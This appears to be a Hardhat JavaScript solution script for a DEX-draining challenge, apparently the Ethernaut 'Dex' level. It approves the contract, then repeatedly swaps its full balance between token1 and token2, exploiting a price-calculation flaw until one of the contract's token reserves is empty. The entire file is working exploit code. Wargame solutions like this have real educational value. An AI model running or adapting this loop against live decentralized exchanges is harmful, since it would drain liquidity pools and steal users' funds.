const { ethers } = require("hardhat");
const hre = require("hardhat");

async function main() {
    const DexAddress = "0x6BA175f02a98709D04D66D26b14376b35e5a1cE4";
    const DEXContract = await hre.ethers.getContractAt("Dex", DexAddress);

    [signer] = await hre.ethers.getSigners();
    signerAddress = await signer.getAddress();

    console.log("1/ Approving");
    const approveTX = await DEXContract.connect(signer).approve(
        DexAddress,
        2000
    );
    await approveTX.wait();

    let fromAddress = await DEXContract.token1();
    let toAddress = await DEXContract.token2();
    let fromBalance, toBalance;
    let contractFromBalance, contractToBalance;
    async function reassignBalance() {
        fromBalance = await DEXContract.balanceOf(fromAddress, signerAddress);
        toBalance = await DEXContract.balanceOf(toAddress, signerAddress);

        contractFromBalance = await DEXContract.balanceOf(
            fromAddress,
            DexAddress
        );
        contractToBalance = await DEXContract.balanceOf(toAddress, DexAddress);
    }
    function logBalance() {
        console.log(fromBalance.toString(), toBalance.toString());
        console.log(
            contractFromBalance.toString(),
            contractToBalance.toString()
        );
    }
    await reassignBalance();
    logBalance();

    transferFromValue = 10;
    console.log("Start");
    while (contractFromBalance > 0 && contractToBalance > 0) {
        if (transferFromValue > fromBalance) {
            transferFromValue = fromBalance;
        }
        logBalance();

        const swapTX = await DEXContract.connect(signer).swap(
            fromAddress,
            toAddress,
            transferFromValue
        );
        await swapTX.wait();
        [fromAddress, toAddress] = [toAddress, fromAddress];
        await reassignBalance();
        transferFromValue = fromBalance;
    }
    console.log("End");

    await reassignBalance();
    logBalance();
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
